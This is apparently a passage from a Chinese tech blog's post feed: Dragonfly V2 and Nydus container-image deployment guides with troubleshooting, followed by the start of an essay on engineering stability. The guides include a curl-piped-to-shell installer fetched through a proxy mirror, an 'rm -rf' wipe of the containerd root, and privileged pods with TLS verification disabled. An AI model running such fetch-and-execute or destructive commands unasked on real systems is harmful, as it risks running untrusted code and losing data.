由于默认的发布包中，没有配置文件，这里先生成一份配置文件，然后再修改。\n1 2 export IP=VM_IP ./run.sh 立即终止执行，然后继续修改配置文件。\n固定镜像版本 1 sed -i \u0026#39;s/latest/v2.1.28/g\u0026#39; docker-compose.yaml 修改存储账号及其他配置 修改 Redis、MySQL 地址和密码\n1 vim config/manager.yaml 修改 Redis 密码\n1 vim config/scheduler.yaml 在这两个配置文件中，还有一些其他的配置项，可以根据实际情况进行修改。比如，manager 的 addr 指向当前主机的服务、将日志输出到控制台、开启 Metrics 等。\n修改 seed-peer 的缓存目录 1 vim docker-compose.yaml 1 2 3 volumes: - ./cache:/var/cache/dragonfly - ./data:/var/lib/dragonfly 如果关闭了 seed-peer 作为 peer 节点的功能，可以跳过这一步，同时，VM 的磁盘空间也可以不用太大。\n启动服务 1 docker-compose up -d 查看服务 1 2 3 4 5 6 docker-compose ps NAME IMAGE COMMAND SERVICE CREATED STATUS PORTS manager dragonflyoss/manager:v2.1.28 \u0026#34;/opt/dragonfly/bin/…\u0026#34; manager 14 hours ago Up 14 hours (healthy) 0.0.0.0:8080-\u0026gt;8080/tcp, 0.0.0.0:65003-\u0026gt;65003/tcp scheduler dragonflyoss/scheduler:v2.1.28 \u0026#34;/opt/dragonfly/bin/…\u0026#34; scheduler 14 hours ago Up 14 hours (healthy) 0.0.0.0:8002-\u0026gt;8002/tcp seed-peer dragonflyoss/dfdaemon:v2.1.28 \u0026#34;/opt/dragonfly/bin/…\u0026#34; seed-peer 14 hours ago Up 14 hours (healthy) 65001/tcp, 0.0.0.0:65006-65008-\u0026gt;65006-65008/tcp 打开管理页面看看 访问 http://${VM_IP}:8080 端口可以看到 Dragonfly 的管理界面，如果机器没有公网 IP，可以使用 socat 进行端口转发。找一台有公网 IP 的机器，执行以下命令，将 30000 端口转发到 8080 端口：\n1 2 export IP=VM_IP socat TCP-LISTEN:30000,fork TCP:$IP:8080 两台 VM 部署完成，在 Dashboard 中可以看到这样一个集群，两个 Scheduler、两个 Seed Peer。如下图:\n4. 在集群部署 Peer 节点 部署 Peer 的节点，需要对两台 VM 的 8002 、65001、65003 、65006-65008 端口有访问权限。\n创建命名空间 1 kubectl create ns dragonfly-system 创建配置文件 这里需要将 LB 的 IP 地址填入配置文件中，Peer 才能接入到 Dragonfly 集群中。\n1 export MANAGER_IP=LB_IP 有很多参数，可以根据实际情况进行修改，这里提供了一份默认的配置文件。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 kubectl apply -f - \u0026lt;\u0026lt;EOF apiVersion: v1 data: dfget.yaml: | aliveTime: 0s gcInterval: 1m0s keepStorage: false workHome: /usr/local/dragonfly logDir: /var/log/dragonfly cacheDir: /var/cache/dragonfly pluginDir: /usr/local/dragonfly/plugins dataDir: /var/lib/dragonfly console: true health: path: /server/ping tcpListen: port: 40901 verbose: true pprof-port: 18066 metrics: \u0026#34;:8000\u0026#34; jaeger: \u0026#34;\u0026#34; scheduler: manager: enable: true netAddrs: - type: tcp addr: $MANAGER_IP:65003 refreshInterval: 10m netAddrs: scheduleTimeout: 30s disableAutoBackSource: false seedPeer: clusterID: 1 enable: false type: super host: idc: \u0026#34;\u0026#34; location: \u0026#34;\u0026#34; download: calculateDigest: true downloadGRPC: security: insecure: true tlsVerify: true unixListen: socket: \u0026#34;\u0026#34; peerGRPC: security: insecure: true tcpListen: port: 65000 perPeerRateLimit: 5120Mi prefetch: false totalRateLimit: 10240Mi upload: rateLimit: 10240Mi security: insecure: true tlsVerify: false tcpListen: port: 65002 objectStorage: enable: false filter: Expires\u0026amp;Signature\u0026amp;ns maxReplicas: 3 security: insecure: true tlsVerify: true tcpListen: port: 65004 storage: diskGCThreshold: 1000Gi multiplex: true strategy: io.d7y.storage.v2.simple taskExpireTime: 72h proxy: defaultFilter: Expires\u0026amp;Signature\u0026amp;ns defaultTag: tcpListen: port: 65001 security: insecure: true tlsVerify: false registryMirror: dynamic: true insecure: false url: https://index.docker.io proxies: - regx: blobs/sha256.* - regx: s3.*amazonaws.com.* - regx: oss.*aliyuncs.com.* - regx: obs.*myhuaweicloud.com.* - regx: ks3.*ksyun.com.* security: autoIssueCert: false caCert: \u0026#34;\u0026#34; certSpec: dnsNames: null ipAddresses: null validityPeriod: 4320h tlsPolicy: prefer tlsVerify: false network: enableIPv6: false announcer: schedulerInterval: 30s kind: ConfigMap metadata: labels: app: dragonfly name: dragonfly-dfdaemon namespace: dragonfly-system EOF 创建 DaemonSet 我们从官方的 Helm Chart 中提取出来的 DaemonSet 文件。需要注意的是，Peer 使用的缓存目录是主机上的 /data/dfget 目录。最好提前清理主机上的 /data/dfget 目录，避免出现权限问题，也不用提前创建，DaemonSet 会自动创建。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 kubectl apply -f - \u0026lt;\u0026lt;EOF apiVersion: apps/v1 kind: DaemonSet metadata: labels: app: dragonfly name: dragonfly-dfdaemon namespace: dragonfly-system spec: selector: matchLabels: app: dragonfly template: metadata: labels: app: dragonfly annotations: prometheus.io/scrape: \u0026#34;true\u0026#34; prometheus.io/port: \u0026#34;8000\u0026#34; prometheus.io/path: \u0026#34;/metrics\u0026#34; spec: containers: - image: dragonflyoss/dfdaemon:v2.1.28 livenessProbe: exec: command: - /bin/grpc_health_probe - -addr=:65000 name: dfdaemon ports: - containerPort: 65001 protocol: TCP - containerPort: 40901 protocol: TCP - containerPort: 8000 protocol: TCP readinessProbe: exec: command: - /bin/grpc_health_probe - -addr=:65000 failureThreshold: 3 initialDelaySeconds: 5 periodSeconds: 10 successThreshold: 1 timeoutSeconds: 1 resources: limits: cpu: \u0026#34;2\u0026#34; memory: 2Gi securityContext: capabilities: add: - SYS_ADMIN volumeMounts: - mountPath: /etc/dragonfly name: config - mountPath: /var/cache/dragonfly name: dfgetcache - mountPath: /var/lib/dragonfly name: dfgetdata hostNetwork: true hostPID: true tolerations: - effect: NoSchedule operator: Exists - effect: NoExecute operator: Exists volumes: - configMap: defaultMode: 420 name: dragonfly-dfdaemon name: config - hostPath: path: /data/dfget/cache type: DirectoryOrCreate name: dfgetcache - hostPath: path: /data/dfget/data type: DirectoryOrCreate name: dfgetdata EOF 查看负载 1 2 3 4 5 6 7 8 kubectl -n dragonfly-system get pod NAME READY STATUS RESTARTS AGE dragonfly-dfdaemon-79qkw 1/1 Running 0 14h dragonfly-dfdaemon-8hhzb 1/1 Running 3 14h dragonfly-dfdaemon-nnfc5 1/1 Running 0 14h dragonfly-dfdaemon-w7lff 1/1 Running 0 14h dragonfly-dfdaemon-wrmzw 1/1 Running 0 14h 5. 在 VM 上部署 Peer 节点 创建目录 1 mkdir -p /data/dfget \u0026amp;\u0026amp; cd /data/dfget 设置 IP 1 wget https://ghproxy.chenshaowen.com/https://raw.githubusercontent.com/shaowenchen/hubimage/main/nydus/dfget.template.yaml -O dfget.yaml 1 2 export MANAGER_IP=LB_IP sed -i \u0026#34;s/__MANAGER_IP__/$MANAGER_IP/g\u0026#34; dfget.yaml 启动 Peer 1 2 3 4 5 6 nerdctl run -d --name=peer --restart=always \\ -p 65000:65000 -p 65001:65001 -p 65002:65002 \\ -v $(pwd)/data:/var/lib/dragonfly \\ -v $(pwd)/cache:/var/cache/dragonfly \\ -v $(pwd)/dfget.yaml:/etc/dragonfly/dfget.yaml:ro \\ dragonflyoss/dfdaemon:v2.1.28 6. 使用节点配置 6.1 Docker Docker 的 Mirror 方式只能加速 Docker.io 的镜像，这里采用 Proxy 的方式，代理全部 Dockerd 的流量。Proxy 与 Mirror 的区别在于，Mirror 挂了，Dockerd 会拉取源站，而 Proxy 挂了，Dockerd 直接拉取失败。\n添加代理 1 mkdir -p /etc/systemd/system/docker.service.d 1 2 3 4 5 cat \u0026gt; /etc/systemd/system/docker.service.d/http-proxy.conf \u0026lt;\u0026lt;EOF [Service] Environment=\u0026#34;HTTP_PROXY=http://127.0.0.1:65001\u0026#34; Environment=\u0026#34;HTTPS_PROXY=http://127.0.0.1:65001\u0026#34; EOF 重启 Docker 1 2 systemctl daemon-reload systemctl restart docker 注意，这里如果 /etc/docker/daemon.json 中没有配置 \u0026quot;live-restore\u0026quot;: true ，会导致容器全部重启。\n查看环境变量 1 2 3 systemctl show --property=Environment docker Environment=HTTP_PROXY=http://127.0.0.1:65001 HTTPS_PROXY=http://127.0.0.1:65001 镜像拉取测试 1 docker pull nginx 此时，Dockerd 的流量会经过 Dragonfly Peer 节点。\n6.2 Containerd 参考 https://github.com/containerd/containerd/blob/main/docs/cri/config.md#registry-configuration\n在 /etc/containerd/config.toml 中 [plugins.\u0026quot;io.containerd.grpc.v1.cri\u0026quot;.registry] 项的 config_path = \u0026quot;/etc/containerd/certs.d\u0026quot; 提供了类似于 mirror 的配置方式。\n配置 Docker.io 1 mkdir -p /etc/containerd/certs.d/docker.io 1 2 3 4 5 6 7 8 9 10 cat \u0026gt; /etc/containerd/certs.d/docker.io/hosts.toml \u0026lt;\u0026lt;EOF server = \u0026#34;https://docker.io\u0026#34; [host.\u0026#34;http://127.0.0.1:65001\u0026#34;] capabilities = [\u0026#34;pull\u0026#34;, \u0026#34;resolve\u0026#34;] [host.\u0026#34;http://127.0.0.1:65001\u0026#34;.header] X-Dragonfly-Registry = [\u0026#34;https://registry-1.docker.io\u0026#34;] [host.\u0026#34;https://registry-1.docker.io\u0026#34;] capabilities = [\u0026#34;pull\u0026#34;, \u0026#34;resolve\u0026#34;] EOF 配置其他、私有镜像仓库 其他镜像仓库的配置可以通过脚本生成，比如：\n1 2 wget https://ghproxy.chenshaowen.com/https://raw.githubusercontent.com/dragonflyoss/Dragonfly2/main/hack/gen-containerd-hosts.sh bash gen-containerd-hosts.sh ghcr.io 这里没有用脚本生成 docker.io 的配置是因为，生成的配置文件中，X-Dragonfly-Registry 是 https://docker.io，而不是 https://registry-1.docker.io。\n使用 X-Dragonfly-Registry = [\u0026quot;https://docker.io\u0026quot;] 会出现如下错误：\n1 unknow type: text/html 以上添加的 mirror，不用重启 Containerd，直接能生效。\n镜像拉取测试 1 nerdctl pull nginx 此时，在本地 /data/dfget/data 目录下可以看到 Peer 节点缓存的镜像数据。\n7. 集成 Nydus 如果 Nydus 已经配置好，这里其实已经能轻松配置好。\n给 Nydusd 添加 mirror 1 vim /etc/nydus/nydusd-config.fusedev.json 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 { \u0026#34;device\u0026#34;: { \u0026#34;backend\u0026#34;: { \u0026#34;type\u0026#34;: \u0026#34;registry\u0026#34;, \u0026#34;config\u0026#34;: { \u0026#34;mirrors\u0026#34;: [ { \u0026#34;host\u0026#34;: \u0026#34;http://127.0.0.1:65001\u0026#34;, \u0026#34;auth_through\u0026#34;: false, \u0026#34;headers\u0026#34;: { \u0026#34;X-Dragonfly-Registry\u0026#34;: \u0026#34;https://index.docker.io\u0026#34; }, \u0026#34;ping_url\u0026#34;: \u0026#34;http://127.0.0.1:40901/server/ping\u0026#34; } ] } } } } 重启 Nydusd 1 systemctl restart nydus-snapshotter 镜像拉取测试 1 nerdctl pull shaowenchen/demo-ubuntu:latest-nydus 8. 总结 本篇记录了这周在生产环境中，测试并部署 Dragonfly V2 的部分过程，主要内容包括：\n机房中 Dragonfly 集群的部署拓扑 集群和 VM 上 Peer 节点的部署 Docker、Containerd、Nydus 的集成 说下不足，没有指标监控，在做 Benchmark 时，我们发现 AZ 内和跨 AZ 的 Peer 之间的数据传输都受限，如果想构建高性能的 P2P 分发网络，Peer 与 Peer、Peer 与 Seed Peer 之间的网络是一个重要的考量因素。\n","description":"","id":77,"section":"post","tags":["博文","AI","Dragonfly","Image","Nydus","配置","实践"],"title":"使用 Dragonfly V2 分发集群的镜像","uri":"https://www.chenshaowen.com/blog/distributing-image-with-dragonfly-v2.html"},{"content":"据统计容器中的大部分文件不会被使用。根据这一特征，Nydus 自定义了 Rafs 格式的文件系统，实现了镜像文件的按需加载，以解决大镜像导致的启动慢和占用存储的问题。而在 AI 场景下，无论是推理还是训练，镜像常常都是几个 G 起步，甚至几十个 G，Nydus 非常适用。\n本篇主要是一些具体操作步骤，用于快速配置镜像懒加载方案 Nydus，以及常见问题的处理方法。\n1. 安装 nerdctl 和 nydus 安装 Opscli 1 curl -sfL https://ghproxy.chenshaowen.com/https://raw.githubusercontent.com/shaowenchen/ops/main/getcli.sh |VERSION=latest sh - 如果已经安装，可以更新 Opscli 到最新版本。\n1 opscli upgrade 安装 nerdctl 1 opscli task -f ~/.ops/tasks/install-nerdctl.yaml 通过 -i ~/.kube/config 参数指定整个集群。\n安装 nydus 1 opscli task -f ~/.ops/tasks/install-nydus.yaml 通过 -i ~/.kube/config 参数指定整个集群。\n2. 启动 nydus-snapshotter 在文档 https://github.com/containerd/nydus-snapshotter/tree/main/misc/snapshotter 中有很多示例配置。我们线上 Linux Kernel 并不是都高于 5.19 ，这里选择了 fuse 的方式。\n2.1 创建配置文件 /etc/nydus/config.toml 1 2 mkdir -p /etc/nydus wget https://ghproxy.chenshaowen.com/https://raw.githubusercontent.com/shaowenchen/hubimage/main/nydus/config.toml -O /etc/nydus/config.toml 2.2 创建配置文件 /etc/nydus/nydusd-config.fusedev.json 配置后端、缓存 1 wget https://ghproxy.chenshaowen.com/https://raw.githubusercontent.com/shaowenchen/hubimage/main/nydus/nydusd-config.fusedev.json -O /etc/nydus/nydusd-config.fusedev.json 创建 Systemd Unit 启动文件 1 wget https://ghproxy.chenshaowen.com/https://raw.githubusercontent.com/shaowenchen/hubimage/main/nydus/nydus-snapshotter.service -O /etc/systemd/system/nydus-snapshotter.service 创建数据目录 1 mkdir -p /data/containerd/io.containerd.snapshotter.v1.nydus 启动配置 1 2 3 systemctl enable nydus-snapshotter systemctl start nydus-snapshotter systemctl status nydus-snapshotter 查看服务日志 1 journalctl -u nydus-snapshotter -f 3. Containerd 集成 Nydus 添加 nydus snapshotter 插件 编辑配置文件\n1 vim /etc/containerd/config.toml 添加如下内容\n1 2 3 4 5 6 7 8 9 10 11 12 13 [plugins] [plugins.\u0026#34;io.containerd.grpc.v1.cri\u0026#34;] [plugins.\u0026#34;io.containerd.grpc.v1.cri\u0026#34;.containerd] default_runtime_name = \u0026#34;runc\u0026#34; ignore_rdt_not_enabled_errors = false no_pivot = false discard_unpacked_layers = false disable_snapshot_annotations = false snapshotter = \u0026#34;nydus\u0026#34; [proxy_plugins] [proxy_plugins.nydus] type = \u0026#34;snapshot\u0026#34; address = \u0026#34;/run/containerd-nydus/containerd-nydus-grpc.sock\u0026#34; 重启 containerd 1 systemctl restart containerd 检查是否安装成功 1 2 3 ctr -a /run/containerd/containerd.sock plugin ls | grep nydus io.containerd.snapshotter.v1 nydus - ok 4. 直接将 OCI 镜像转换成 Nydus 镜像 登录镜像仓库 1 nerdctl login https://index.docker.io/v1/ nerdctl 的用法和 docker 一样，如果有使用到其他仓库，就登录其他仓库。\n转换镜像 1 2 3 4 5 6 7 8 nydusify convert --source shaowenchen/demo-ubuntu:latest --target shaowenchen/demo-ubuntu:latest-nydus pulling image docker.io/shaowenchen/demo-ubuntu:latest module=converter pulled image docker.io/shaowenchen/demo-ubuntu:latest, elapse 9.743015898s module=converter converting image docker.io/shaowenchen/demo-ubuntu:latest module=converter converted image docker.io/shaowenchen/demo-ubuntu:latest-nydus, elapse 4.002142728s module=converter pushing image docker.io/shaowenchen/demo-ubuntu:latest-nydus module=converter pushed image docker.io/shaowenchen/demo-ubuntu:latest-nydus, elapse 1m25.054493982s module=converter 可以通过 --backend-config-file ~/.docker/config.json 指定镜像仓库的凭证。\n5. 使用 Buildkit 构建 Dockerfile 生成 Nydus 镜像 除了使用 Nydusify 转换，还可以直接构建 Dockerfile 生成 Nydus 镜像。\n下载 Buildkit https://github.com/moby/buildkit 提供的源码不支持 Nydus，需要使用 https://github.com/nydusaccelerator/buildkit 提供的版本，但后者又没有 release 版本，需要下载编译。这里，我编译好了一个版本，可以直接下载使用。\n1 wget https://ghproxy.chenshaowen.com/https://github.com/shaowenchen/nydusaccelerator-buildkit/releases/download/latest/buildkit-linux-amd64.tar.gz 安装 Buildkit 1 2 tar xvf buildkit-linux-amd64.tar.gz mv bin/* /usr/local/bin/ 配置 Buildkitd 1 mkdir -p /etc/buildkit /data/buildkit 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 cat \u0026gt; /etc/buildkit/buildkitd.toml \u0026lt;\u0026lt;EOF debug = true root = \u0026#34;/data/buildkit\u0026#34; [worker.oci] enabled = false [worker.containerd] address = \u0026#34;/run/containerd/containerd.sock\u0026#34; enabled = true platforms = [ \u0026#34;linux/amd64\u0026#34;, \u0026#34;linux/arm64\u0026#34; ] namespace = \u0026#34;buildkit\u0026#34; gc = true gckeepstorage = 9000 cniPoolSize = 16 EOF 生成 Systemd Unit 文件\n1 2 3 4 5 6 7 8 9 10 11 12 cat \u0026gt; /etc/systemd/system/buildkitd.service \u0026lt;\u0026lt; EOF [Unit] Description=buildkitd service Documentation=https://github.com/moby/buildkit [Service] Environment=\u0026#34;NYDUS_BUILDER=/usr/local/bin/nydus-image\u0026#34; ExecStart=/usr/local/bin/buildkitd --config /etc/buildkit/buildkitd.toml [Install] WantedBy=multi-user.target EOF 启动 Buildkitd 服务 1 2 3 systemctl enable buildkitd systemctl start buildkitd systemctl status buildkitd 测试 Buildkitd 构建 Nydus 镜像 1 2 3 4 cat \u0026lt;\u0026lt; EOF \u0026gt;Dockerfile FROM shaowenchen/demo-ubuntu:latest RUN touch 123 EOF 1 2 3 4 buildctl build --frontend=dockerfile.v0 \\ --local context=. \\ --local dockerfile=. \\ --output type=image,name=shaowenchen/demo-ubuntu:latest-build-nydus,push=true,compression=nydus,force-compression=true,oci-mediatypes=true 也可以使用 nerdctl 进行构建，nerdctl 会自动调用 buildkit 进行构建。\n1 nerdctl build -f Dockerfile --output type=image,name=shaowenchen/demo-ubuntu:latest-build-nydus,push=true,compression=nydus,force-compression=true,oci-mediatypes=true . 推送使用的凭证是 ~/.docker/config.json，可使用 nerdctl login 登录。\n验证镜像 1 nerdctl --snapshotter nydus run --rm -it shaowenchen/demo-ubuntu:latest-build-nydus 6. 应用层验证 Nydus 6.1 Containerd 1 nerdctl --snapshotter nydus run --rm -it shaowenchen/demo-ubuntu:latest-nydus 其他 Nydus 镜像还有\nshaowenchen/demo-whomai:latest-nydus dragonflyoss/python:3.9.15-nydus ghcr.io/dragonflyoss/image-service/ubuntu:nydus-nightly-v5 6.2 Kubernetes 创建负载 1 kubectl create deployment nydus-test --image=shaowenchen/demo-ubuntu:latest-nydus 也可以直接创建 DaemonSet 在每个节点上进行测试。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 cat \u0026lt;\u0026lt; EOF | kubectl apply -f - apiVersion: apps/v1 kind: DaemonSet metadata: name: nydus-test-daemonset spec: selector: matchLabels: app: nydus-test-daemonset template: metadata: labels: app: nydus-test-daemonset name: nydus-test-daemonset spec: tolerations: - key: \u0026#34;node-role.kubernetes.io/control-plane\u0026#34; operator: \u0026#34;Exists\u0026#34; effect: \u0026#34;NoSchedule\u0026#34; containers: - image: shaowenchen/demo-ubuntu:latest-nydus name: nydus-test-daemonset EOF 查看负载 1 kubectl get deployment nydus-test -o wide 换不同节点 1 kubectl patch deployment nydus-test -p \u0026#39;{\u0026#34;spec\u0026#34;:{\u0026#34;template\u0026#34;:{\u0026#34;spec\u0026#34;:{\u0026#34;nodeName\u0026#34;:\u0026#34;node1\u0026#34;}}}}\u0026#39; 清理负载 1 kubectl delete deployment nydus-test 7. 配置 Grafana 监控面板查看 Nydus 指标 编辑 prometheus-server 配置 1 kubectl -n monitor edit cm prometheus-server 添加抓取 Nydus 指标的 Job 1 2 3 4 5 6 7 scrape_configs: - job_name: nydus metrics_path: /v1/metrics static_configs: - targets: - x.x.x.x:9110 - x.x.x.x:9110 在 Grafana 添加面板 我绘制了一个简单的面板，已经分享到 Grafana 官网，可以直接导入，ID 为 20245 ，链接地址 https://grafana.com/grafana/dashboards/20245-nydus-dashboard/ 。\n最终效果如下:\n8. 常见错误处理 使用 Nydus 时，可能会遇到各种问题，这里记录我遇到的问题和处理方式，持续更新。最好能使用干净的环境，一次性配置成功，反复配置可能会出现一些奇怪的问题。\n8.1 拉取镜像时 no processor for media-type 报错信息 1 FATA[0000] failed to extract layer sha256:58e33caaf7a78562cc25629ed0414320c3d755b66bf1f313fdcff75748102013: failed to get stream processor for application/vnd.oci.image.layer.nydus.blob.v1: no processor for media-type: unknown 1 failed to register layer: Error processing tar file(exit status 1): archive/tar: invalid tar header 处理方式 nydus-snapshotter 服务异常，需要查看服务日志，或者在没有配置 Nydus 的情况下拉取镜像。\n1 journalctl -u nydus-snapshotter.service -f 8.2 应用起不来，snapshot already exists 报错信息 1 FATA[0001] unable to prepare extraction snapshot: target snapshot \u0026#34;sha256:58e33caaf7a78562cc25629ed0414320c3d755b66bf1f313fdcff75748102013\u0026#34;: already exists 1 create snapshot: missing parent \u0026#34;k8s.io/14/sha256:e3e5579ddd43c08e4b5c74dc12941a4ef656fab070b1087a1fd5a8a836b71e7d\u0026#34; bucket: not found 处理方式 先删除应用的镜像，清理缓存之后，再次重试。\n1 nerdctl rmi shaowenchen/demo-ubuntu:latest-nydus 1 nerdctl image prune --force --all 8.3 nydus-snapshotter 起不来，failed to initialize snapshotter: initialize filesystem 报错信息 1 2 3 level=error msg=\u0026#34;Process 770795 has been a zombie\u0026#34; ... level=fatal msg=\u0026#34;failed to start nydus-snapshotter\u0026#34; error=\u0026#34;failed to initialize snapshotter: initialize filesystem thin layer: wait for daemon cmb35s0g2p2n0dt9tqag: wait until daemon is RUNNING: get daemon state: daemon socket /data/containerd/io.containerd.snapshotter.v1.nydus/socket/cmb35s0g2p2n0dt9tqag/api.sock: not found\u0026#34; 可能还有另外一个 containerd-nydus-grpc 没有彻底退出。\n处理方式 1 ps aux |grep containerd-nydus-grpc 找到并杀掉另外一个进程，然后重启 nydus-snapshotter 服务。\n8.4 nydus-snapshotter 起不来，failed to parse configuration information 报错信息 1 2 3 4 5 6 7 \u0026#34;failed to parse configuration information\u0026#34; containerd-nydus-grpc[21763]: at api/src/config.rs:243 containerd-nydus-grpc[21763]: note: enable `RUST_BACKTRACE=1` env to display a backtrace containerd-nydus-grpc[21763]: [2024-01-04 17:19:49.125269 +08:00] ERROR [/src/error.rs:22] Error: containerd-nydus-grpc[21763]: Rafs(LoadConfig(Os { code: 22, kind: InvalidInput, message: \u0026#34;Invalid argument\u0026#34; })) containerd-nydus-grpc[21763]: at service/src/lib.rs:121 containerd-nydus-grpc[21763]: note: enable `RUST_BACKTRACE=1` env to display a backtrace 处理方式 根据提示是配置文件有问题，包括，配置格式、键值、目录是否存在等。我遇到的问题是 root 目录不存在。\n1 mkdir -p /data/containerd/io.containerd.snapshotter.v1.nydus 1 systemctl restart nydus-snapshotter 8.5 Kubelet 报错，找不到目录 报错 1 Failed to get the info of the filesystem with mountpoint\u0026#34; err=\u0026#34;failed to get device for dir \u0026#34;/var/lib/containerd/io.containerd.snapshotter.v1.nydus\u0026#34;: stat failed on /var/lib/containerd/io.containerd.snapshotter.v1.nydus with error: no such file or directory\u0026#34; mountpoint=\u0026#34;/var/lib/containerd/io.containerd.snapshotter.v1.nydus\u0026#34; 处理方式 根据 https://github.com/containerd/nydus-snapshotter/issues/288 ，Nydus 目前的 root 目录需要为 $containerd_root_dir/io.containerd.snapshotter.v1.nydus。\n查看 containerd 的 root 目录\n1 2 3 cat /etc/containerd/config.toml |grep root root = \u0026#34;/var/lib/containerd\u0026#34; 编辑 Nydus 配置文件\n1 vim /etc/nydus/config.toml 修改 root 目录为 containerd 的 root 目录下的子目录 io.containerd.snapshotter.v1.nydus 。创建一下这个目录，然后重启 nydus-snapshotter 服务。\n8.6 重启之后 Containerd 托管的 Pod 无法启动、Init:CreateContainerError 报错 处理方式 先关闭 containerd 中的 nydus 配置\n1 2 sed -i \u0026#39;s/snapshotter = \u0026#34;nydus\u0026#34;/snapshotter = \u0026#34;\u0026#34;/g\u0026#39; /etc/containerd/config.toml systemctl restart containerd.service 等待一会儿，再打开 nydus 配置。\n1 2 sed -i \u0026#39;s/snapshotter = \u0026#34;\u0026#34;/snapshotter = \u0026#34;nydus\u0026#34;/g\u0026#39; /etc/containerd/config.toml systemctl restart containerd.service 8.7 应用起不来，报错 bucket: not found 报错信息 1 containerd[937]: time=\u0026#34;2024-01-07T08:17:13.044578960+08:00\u0026#34; level=error msg=\u0026#34;RunPodSandbox for \u0026amp;PodSandboxMetadata{Name:kube-scheduler-k8s-master-03,Uid:d63b14268dcd89918c2eba5fa110d396,Namespace:kube-system,Attempt:2,} failed, error\u0026#34; error=\u0026#34;rpc error: code = NotFound desc = failed to create containerd container: create snapshot: missing parent \\\u0026#34;k8s.io/14/sha256:e3e5579ddd43c08e4b5c74dc12941a4ef656fab070b1087a1fd5a8a836b71e7d\\\u0026#34; bucket: not found\u0026#34; 处理方式 去主机上直接拉取镜像，看看是否能拉取成功。\n如果依然失败，尝试清理一下镜像再试。\n清空 Containerd 的 root 目录，重启机器，实测可行。\n8.8 应用启动时 input/output error 报错信息 1 FATA[0001] mount callback failed on /run/user/0/containerd-mount3967735320: read /run/user/0/containerd-mount3967735320/etc/group: input/output error 处理方式 清理 Containerd 的 root 目录，重启机器，实测可行。\n1 2 3 systemctl disable nydus-snapshotter systemctl disable containerd systemctl disable kubelet 1 reboot 1 2 3 4 rm -rf /data/containerd/* systemctl enable nydus-snapshotter systemctl enable containerd systemctl enable kubelet 1 reboot 8.9 nydus-snapshotter 启动时报错 报错信息 1 2 3 journalctl -u nydus-snapshotter.service | grep error Aug 08 19:15:01 aliyun-bj-f-k8s-4090-10 containerd-nydus-grpc[5151]: time=\u0026#34;2024-08-08T19:15:01.311252782+08:00\u0026#34; level=error msg=\u0026#34;failed to destroy cgroup, err cgroups: unable to remove path \\\u0026#34;/sys/fs/cgroup/system.slice/nydusd\\\u0026#34;: still contains running processes\u0026#34; 处理方式 先停掉 nydus-snapshotter 和 nydus 相关的进程\n1 2 3 systemctl stop nydus-snapshotter ps aux |grep nydus 删除报错的 cgroup\n1 rmdir /sys/fs/cgroup/system.slice/nydusd 重启 Nydus-snapshotter\n1 systemctl restart nydus-snapshotter ","description":"","id":78,"section":"post","tags":["博文","AI","Nydus","配置","实践"],"title":"Nydus 懒加载镜像配置与实践","uri":"https://www.chenshaowen.com/blog/nydus-configuration-and-practice.html"},{"content":"1. 高速前进的轮子才能保持平衡 1.1 C 端红利期已经过去 截至 2023 年 6 月，我国网民规模达 10.79 亿人，较 2022 年 12 月增长 1109 万人，互联网普及率达 76.4%。C 端人口红利期已过，上网时长也增长缓慢，各类存量场景下的应用增长空间已经不大。\n在经历了 C 端的 easy 模式之后，很多公司适应不了 B 端的 hard 模式。C 端有足够的的人群，给我们打磨产品，足够多样的变现方式；但 B 端的用户根本不给我们实验的机会，上来就要求完美适用的产品，而软件产品为了控制边际成本，对非标品的支持与投入是非常有限的。拿着 C 端赚到的钱，投入到 B 端寻找新的增长点，这就是现在很多大厂正在做的事。\n1.2 高楼已成，不再需要那么多工人 这是 2023 年有次出差和同事聊到的一个观点: 我们的平台已经建设成型，就像建好的一座高楼，需要的是少量物业人员，而不是大量的建筑工人。\n我们的效能平台、业务服务，在从 0 到 1 开发时，会高价从外部挖专家、调动内部骨干积极建设；从 1 到 100 迭代时，会继续投入大量的机器资源、运维人力、高响应优先级；但从 100 到 110 呢？边际收益越来越低，即使投入大量的资源，也很难获得线性的收益。\n平台已成，小修小补就能够满足需求。以前 2 个人维护一个产品，现在一个人维护 2 个产品。人员互备都不用了，给一挺机枪就想守住一片山头，根本没有敌人会来的预期。\n1.3 增速放缓，稳定性问题凸显 在业务高速增长时，产品在不停迭代，线上有人盯着，能够及时发现、修复问题。但当业务增长放缓时，产品没有稳定的发版频率，相关人员责任心缺失，各种线上的小问题就会被忽略，而这些小问题的集中爆发就会导致真正的大事故。\n反过来也是对的，一个大事故隐藏着很多小问题。一次不可用的事故，背后可能隐藏着很多的缺陷，比如，没有做好容灾、没有做好故障转移、没有做好限流、没有做好监控、没有做好告警等。如果每一点都能做好，没有短板，这个事故很有可能就不会发生。\n2. 接下来将会面临真正的挑战 2023 年，我经历了很多次业务大小事故，包括上微博热搜的。\n2.1 技术是否过硬 各不相同的 Golang 协程泄露事件。丢包，协程打爆；连不上数据库，协程打爆；CPU 不够了，协程打爆。\n基础库老旧、版本多样，Golang 版本低，一个统一的应用框架也没有。\n这些暴露出来的问题，在存量时代已经不容易解决。但线上问题不断，又不得不解决，考验我们技术功底的时候到了。\n2.2 架构是否合理 各种服务调用错中复杂，缺少治理。人能够处理的复杂度是有限的，业务增长时，粗放式让业务自由选型，缺少统一的管理，服务调用关系没人能够梳理清楚。\n各种跨集群调用、跨机房调用、内部调用走公网等乱象，几个服务互调把 QPS 量拉升几倍。\n服务的就近调用，用户的就近访问，集群的单元化建设，这些以前被忽略的问题，现在都直接影响到了应用的稳定性。\n2.3 稳定性是否可靠 增量没了，拿不到 90 分；想拿到 60 